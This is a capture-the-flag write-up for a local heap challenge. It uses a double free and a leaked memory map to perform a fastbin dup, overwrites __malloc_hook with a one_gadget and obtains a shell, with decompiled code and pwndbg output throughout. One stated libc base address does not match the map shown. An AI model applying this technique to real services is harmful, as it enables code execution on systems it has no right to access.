# Solution

Connecting to the challenge we get several options:
```sh
$ nc localhost 9000
      :::        ::::::::  :::        :::::::::     :::      ::::::::   :::::::: 
     :+:       :+:    :+: :+:        :+:    :+:  :+: :+:   :+:    :+: :+:    :+: 
    +:+       +:+    +:+ +:+        +:+    +:+ +:+   +:+  +:+        +:+         
   +#+       +#+    +:+ +#+        +#++:++#+ +#++:++#++: +#++:++#++ +#++:++#++   
  +#+       +#+    +#+ +#+        +#+       +#+     +#+        +#+        +#+    
 #+#       #+#    #+# #+#        #+#       #+#     #+# #+#    #+# #+#    #+#     
########## ########  ########## ###       ###     ###  ########   ########       
  - We keep your secrets in memory.

1. Create new secret (0/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 
```

Based on actions available, players may reverse engineer the binary to find all issues or simply test them out and confirm:
- input overflow via `secret_inp` function:
```c
void secret_inp(char *param_1)

{
  printf("Secret content: ");
  fgets(param_1,0x400,stdin);
  return;
}
```

- double free in `drop` function after chunk is created:
```c
void drop(byte param_1)

{
  if (*(long *)(ptrs + (long)(int)(uint)param_1 * 8) == 0) {
    printf("Err: cannot delete slot %d\n",(ulong)param_1);
  }
  else {
    free(*(void **)(ptrs + (long)(int)(uint)param_1 * 8));
    printf("Deleted slot %d\n",(ulong)param_1);
  }
  return;
}
```
double free confirmed with interactive testing:
```sh
1. Create new secret (0/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 1
Secret content: a
1. Create new secret (1/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 4
Secret index: 0
Deleted slot 0
1. Create new secret (1/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 4
Secret index: 0
free(): double free detected in tcache 2
Aborted (core dumped)
```

- reading free memory:
```sh
1. Create new secret (0/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 1
Secret content: a 
1. Create new secret (1/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 4
Secret index: 0
Deleted slot 0
1. Create new secret (1/20)
2. Read secret
3. Update secret
4. Delete secret
5. Perform self-test
9. About lolpass
0. Exit
Your choice: 2
Secret index: 0
0. - �U
```

Additionally, an _update_ is also not an update but a completely new `calloc` call as seen in the `new_or_update` function:
```c
void new_or_update(byte param_1,char param_2)

{
  void *pvVar1;
  
  if ((param_2 == '\0') ||
     ((param_2 != '\0' && (*(long *)(ptrs + (long)(int)(uint)param_1 * 8) != 0)))) {
    pvVar1 = calloc(1,100);
    *(void **)(ptrs + (long)(int)(uint)param_1 * 8) = pvVar1;
    secret_inp(*(char **)(ptrs + (long)(int)(uint)param_1 * 8));
  }
  else {
    printf("Err: cannot operate on slot %d\n",(ulong)param_1);
  }
  return;
}
```

Other options also exist:
- printing memory map with an _about_ option, thus leaking addresses
- performing self-test which performs most important function calls to see if everything works

Considering that maps are leaked, we can call `calloc` as much as we want, `free` the same memory as much as we want and `read` any chunk content not depending on its state, it's possible to perfom any type of _heap feng shui_, but, for simplicity and speed, we will demonstrate how to leverage a shell with a simple fastbin dup technique.

## Leaking libc base address

The information leak issue is straightforward, we parse the output of the _about_ menu choice:
```
...
Your choice: 9
lolpass 0.1 © Serious security takers
564e018f2000-564e018f3000 r--p 00000000 00:3f 1314386                    /ctf/lolpass
564e018f3000-564e018f4000 r-xp 00001000 00:3f 1314386                    /ctf/lolpass
564e018f4000-564e018f5000 r--p 00002000 00:3f 1314386                    /ctf/lolpass
564e018f5000-564e018f6000 r--p 00002000 00:3f 1314386                    /ctf/lolpass
564e018f6000-564e018f7000 rw-p 00003000 00:3f 1314386                    /ctf/lolpass
7fad54e79000-7fad54e9e000 r--p 00000000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad54e9e000-7fad55016000 r-xp 00025000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad55016000-7fad55060000 r--p 0019d000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad55060000-7fad55061000 ---p 001e7000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad55061000-7fad55064000 r--p 001e7000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad55064000-7fad55067000 rw-p 001ea000 00:3f 791268                     /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fad55067000-7fad5506d000 rw-p 00000000 00:00 0 
7fad5506f000-7fad55070000 r--p 00000000 00:3f 791246                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fad55070000-7fad55093000 r-xp 00001000 00:3f 791246                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fad55093000-7fad5509b000 r--p 00024000 00:3f 791246                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fad5509c000-7fad5509d000 r--p 0002c000 00:3f 791246                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fad5509d000-7fad5509e000 rw-p 0002d000 00:3f 791246                     /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fad5509e000-7fad5509f000 rw-p 00000000 00:00 0 
7fffb8320000-7fffb8341000 rw-p 00000000 00:00 0                          [stack]
7fffb83a2000-7fffb83a6000 r--p 00000000 00:00 0                          [vvar]
7fffb83a6000-7fffb83a8000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]

```

The first line that links to `libc-2.31.so` is the one leaking the base address (in previous snippet `7fae1add9000`).

## Fastbin dup technique

In order to perform the fastbin dup, we have to fill the tcache first. Luckily, only `calloc` is available for chunk allocation, giving us ability to fill the tcache and only operate on the chunks from the fastbins.

When the tcache is filled, we allocate at least two new chunks and free them in the appropriate order to prevent libc from detecting our double free:
```
free(first)
free(second)
free(first)
```

By allocating new chunks (creating a new secret) we will be able to write into the fastbin and thus obtain an arbitrary write to an address of our choice.

This is the state before allocating a new chunk:
```
pwndbg> tcache
{
  counts = {0, 0, 0, 0, 0, 7, 0 <repeats 58 times>},
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x564448cfb5b0, 0x0 <repeats 58 times>}
}
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x564448cfb610 —▸ 0x564448cfb680 ◂— 0x564448cfb610
0x80: 0x0
```

This is the state after allocating a new chunk (`0x564448cfb610`) and writing data into it:
```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x564448cfb680 —▸ 0x564448cfb610 ◂— 'AAAAAAAAAAAAAAAAAAAAAA\n'
0x80: 0x0
```

By performing an additional three allocations, we will obtain control on an address that was written in the first chunk that was both in use and freed.

## Leveraging a shell with the fastbin dup

In order to leverage a shell with the fastbin dup technique, we can use any of the libc hooks (`malloc_hook`, `free_hook`, `realloc_hook`, ...), we just have to be able to construct a fake chunk in the vicinity of one of the mentioned hooks. With pwndbg we can investigate and discover that one fake fast chunk can be constructed and it perfectly fits our chunk size (0x70 fast chunk):
```
pwndbg> find_fake_fast &__malloc_hook
FAKE CHUNKS
Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7f7eac505b3d
prev_size: 0x7eac506f60000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0x7eac3b7570000000
bk_nextsize: 0x7eac3b7bf000007f
```

The suggested address is -51 offset from our `malloc_hook`:
```
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7f7eac505b70 <__malloc_hook>
pwndbg> p 0x7f7eac505b70 - 0x7f7eac505b3d
$2 = 51
```

This means that we will have to write the suggested address as the `fd` pointer of the freed chunk and overflow with 35 bytes of garbage before we start writing into the `malloc_hook`. Additionally, an appropriate one gadget has to be picked from the available ones:
```sh
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

## Resolving one gadget issues

If we overwrite our malloc hook with the first suggested one gadget `0xe6c7e` and execute the creation of the new secret, we will observe that none of the register combinations are aligned to execute `/bin/sh`:
```
pwndbg> i r r12 r15 rdx rsi
r12            0x64                100
r15            0x0                 0
rdx            0x64                100
rsi            0x0                 0
```

This is because of the definition of the chunk size passed to `calloc`. Unfortunately, this cannot be circumvented easily if we want to create a new secret. But, recall that the _self-test_ feature is available, which will perform a `calloc` call with a 0 size chunk (hopefully giving us clear registers in the process). We test this assumption:

```
pwndbg> b *__malloc_hook
Breakpoint 1 at 0x7f9b2b1b4c7e: file execvpe.c, line 67.
pwndbg> c
Continuing.

Breakpoint 1, maybe_script_execute (envp=<optimized out>, argv=<optimized out>, file=<optimized out>) at execvpe.c:67
67	execvpe.c: No such file or directory.
...
pwndbg> i r r15 r12 rdx rsi
r15            0x0                 0
r12            0x0                 0
rdx            0x7f9b2b1b4c7e      140304419867774
rsi            0x56454ed75413      94855675466771
```

Great! The `r15` and `r12` registers are set to `NULL` when the `malloc_hook` call is performed, meaning that that _self-test_ option will give us a shell. 

The full exploit script with comments is in `solve.py`:
```sh
$ python3 solve.py 
[+] Opening connection to localhost on port 9000: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
malloc hook is at 0x7fad60ba8b70
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -al
total 36
drwxr-xr-x 1 root root  4096 Dec 27 14:59 .
drwxr-xr-x 1 root root  4096 Dec 27 14:59 ..
-rwxr-xr-x 1 root root    66 Nov 26 17:42 flag.txt
-rwxr-xr-x 1 root root 17936 Dec 27 14:59 lolpass
-rwxr-xr-x 1 root root    29 Nov 26 17:42 start.sh
$ cat flag.txt
ibctf{d0-n0t-put_y0ur_b3d-1n-fr0nt-0f_th3_d00r-cuz-u_w0nt_g3t-in}
```
